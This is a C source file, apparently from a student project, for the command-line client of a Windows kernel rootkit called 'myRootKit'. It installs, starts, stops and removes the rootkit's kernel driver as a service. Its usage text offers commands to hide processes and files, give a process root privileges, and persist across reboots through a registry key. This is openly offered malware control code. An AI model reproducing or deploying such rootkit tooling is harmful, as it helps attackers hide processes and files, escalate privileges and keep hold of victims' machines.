/*
** File		client.c
** Author	lucaze_b <alexis1.lucazeau@epitech.eu>
** Desc		Just a simple client to comunicate to the rootkit
*/

#include <stdio.h>
#include <windows.h>
#include <winioctl.h>
#include <stdlib.h>
#include <string.h>
#include "client.h"

SC_HANDLE	hSCManager = 0;

void		printUsage(char *params)
{
	printf("myRootKit 1.0\n");
	printf("Usage: .\\client.exe [COMMAND]\n\n");
	printf("COMMANDS:\n");
	printf("    --start           Register and start service\n");
	printf("    --stop            Stop and unregister service\n");
	printf("    --restart         Restart service (stop, unregister, register and start)\n");
	printf("    --hp <PID/NAME>   Hide a process by PID or Name\n");
	printf("    --hf <FILENAME>   Hide a file or directory\n");
	printf("    --root <PID/NAME> Give root privileges to a process by PID or Name\n");
	printf("    --reboot <on/off> Survive reboot (registry key)\n");
	printf("    --help            Print this usage\n");
	printf("\n");
}

void			startService(char *params)
{
	SC_HANDLE	hService;
	
	params = params;
	printf("Creating service...\n");
	hService = CreateService(
		hSCManager,
		DRIVER_NAME,
		DRIVER_NAME,
		SERVICE_ALL_ACCESS,
		SERVICE_KERNEL_DRIVER,
		SERVICE_DEMAND_START,
		SERVICE_ERROR_NORMAL,
		DRIVERBIN_PATH,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL);
	if (!hService)
	{
		printf("CreateService failed (%d)\n", GetLastError());
		exit (EXIT_FAILURE);
	}
	printf("Creating service success\n");
	
	printf("Starting service...\n");
	if (!(StartService(hService, 0, NULL)))
	{
		printf("StartService failed (%d)\n", GetLastError());
		CloseServiceHandle(hService);
		exit (EXIT_FAILURE);
	}
	printf("Starting service success\n");
	CloseServiceHandle(hService);
}

void				stopService(char *params)
{
	SC_HANDLE		hService;
	SERVICE_STATUS	serviceStatus;

	params = params;
	if (!(hService = OpenService(hSCManager, DRIVER_NAME, SERVICE_ALL_ACCESS)))
	{
		printf("Opening service failed (%d)\n", GetLastError());
		exit (EXIT_FAILURE);
	}
	
	printf("Stoping service...\n");
	if (!(ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus)))
	{
		if (GetLastError() == 1062)
			printf("Service already stoped\n", GetLastError());
		else
			printf("ControlService failed (%d)\n", GetLastError());
	}
	else
		printf("Stoping service success\n");
	
	printf("Deleting service...\n");
	if(!(DeleteService(hService)))
		printf("Deleting service failed (%d)\n", GetLastError());
	else
		printf("Deleting service success\n");
	CloseServiceHandle(hService);
}

void		restartService(char *params)
{
	stopService(params);
	startService(params);
}

int			proceed(int argc, char *argv[])
{
	int		i;
	int		nbParams;
	char	*params;

	if (argc > 1)
	{
		for (i = 1; i < argc; i++)
		{
			nbParams = getNbParams(argv[i]);
			if (nbParams > -1)
			{
				if (i + nbParams < argc)
				{
					params = concatParams(argv + i, nbParams + 1);
					execCommand(argv[i], params);
					i += nbParams;
				}
				else
				{
					printf("Wrong parameter(s) for command: %s\n", argv[i]);
					return (-1);
				}
			}
			else
			{
				printf("Wrong command: %s\n", argv[i]);
				return (-1);
			}
		}
	}
	else
		printUsage(argv[0]);
	return (0);
}

int			main(int argc, char *argv[])
{
	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!hSCManager)
	{
		printf("OpenSCManger failed (%d)\n", GetLastError());
		return (EXIT_FAILURE);
	}
	proceed(argc, argv);
	CloseServiceHandle(hSCManager);
	return (EXIT_SUCCESS);
}
